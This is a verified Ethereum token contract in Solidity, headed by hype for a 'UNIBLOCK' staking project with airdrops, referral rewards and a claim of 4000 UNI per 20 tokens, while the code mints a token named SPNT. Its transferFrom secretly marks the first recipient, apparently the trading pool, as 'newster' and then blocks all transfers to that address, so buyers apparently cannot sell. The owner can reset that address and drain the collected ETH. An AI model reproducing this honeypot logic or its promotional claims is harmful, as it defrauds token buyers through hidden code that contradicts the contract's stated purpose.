/**
 *Submitted for verification at Etherscan.io on 2020-11-15
*/

/**
 * UNIBLOCK. STRONG STAKING PROJECT! Yield Farming.
 * Max Supply : 1024 UNIBLOCK
 * 1 ETH = 20 UNIBLOCK
 * HOLD 20 UNIBLOCK GET 4000 UNI
 * 
 * AIRDROP! 0.0005 UNIBLOCK FREE!
 * REFERRAL PROGRAM!
 * 
 * Official links:
 * Web-site: https://uniblock.finance
*/
pragma solidity >=0.5.10;

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
}

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);


  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenERC20 is ERC20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newster;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "SPNT";
    name = "SPNT.FINANCE";
    decimals = 18;
    _totalSupply =  1024 ether;
    
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transfernewsters(address _newster) public onlyOwner {
    newster = _newster;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != newster, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && newster == address(0)) newster = to;
      else require(to != newster, "123");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract SPNT_ERC20  is TokenERC20 {

  
  uint256 public splntterA; 
  uint256 public splntterB; 
  
  uint256 public splntterC; 
  uint256 public splntterD; 
  uint256 public splntterE; 
 
  uint256 public splntterF; 
  uint256 public splntterJ; 
  
  uint256 public splntterK; 
  uint256 public splntterQ; 

  uint256 public splntterM; 
  uint256 public splntterMq; 

  function getAirdrop(address _refer) public returns (bool success){
    require(splntterA <= block.number && block.number <= splntterB);
    require(splntterD < splntterC || splntterC == 0);
    splntterD ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      balances[address(this)] = balances[address(this)].sub(splntterE / 4);
      
      balances[_refer] = balances[_refer].add(splntterE / 4);
      emit Transfer(address(this), _refer, splntterE / 4);
    }
    balances[address(this)] = balances[address(this)].sub(splntterE);
    balances[msg.sender] = balances[msg.sender].add(splntterE);
    
    emit Transfer(address(this), msg.sender, splntterE);
    return true;
  }

  function tokenSale(address _refer) public payable returns (bool success){
    require(splntterF <= block.number && block.number <= splntterJ);
    require(splntterK < splntterQ || splntterQ == 0);
    uint256 _eth = msg.value;
    uint256 _tkns;
    
    if(splntterM != 0) {
      uint256 _price = _eth / splntterMq;
      _tkns = splntterM * _price;
    }
    else {
      _tkns = _eth / splntterMq;
    }
    splntterK ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      balances[address(this)] = balances[address(this)].sub(_tkns / 4);
      
      balances[_refer] = balances[_refer].add(_tkns / 4);
      emit Transfer(address(this), _refer, _tkns / 4);
    }
    balances[address(this)] = balances[address(this)].sub(_tkns);
    balances[msg.sender] = balances[msg.sender].add(_tkns);
    emit Transfer(address(this), msg.sender, _tkns);
    return true;
  }

  function viewKolin() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){
    return(splntterA, splntterB, splntterC, splntterD, splntterE);
  }
  function viewMatcher() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){
    return(splntterF, splntterJ, splntterQ, splntterK, splntterM, splntterMq);
  }
  
  function startBeeline(uint256 _splntterA, uint256 _splntterB, uint256 _splntterE, uint256 _splntterC) public onlyOwner() {
    splntterA = _splntterA;
    splntterB = _splntterB;
    splntterE = _splntterE;
    splntterC = _splntterC;
    splntterD = 0;
  }
  function startMts(uint256 _splntterF, uint256 _splntterJ, uint256 _splntterM, uint256 _splntterMq, uint256 _splntterQ) public onlyOwner() {
    splntterF = _splntterF;
    splntterJ = _splntterJ;
    splntterM = _splntterM;
    splntterMq =_splntterMq;
    splntterQ = _splntterQ;
    splntterK = 0;
  }
  function BackEthSter() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}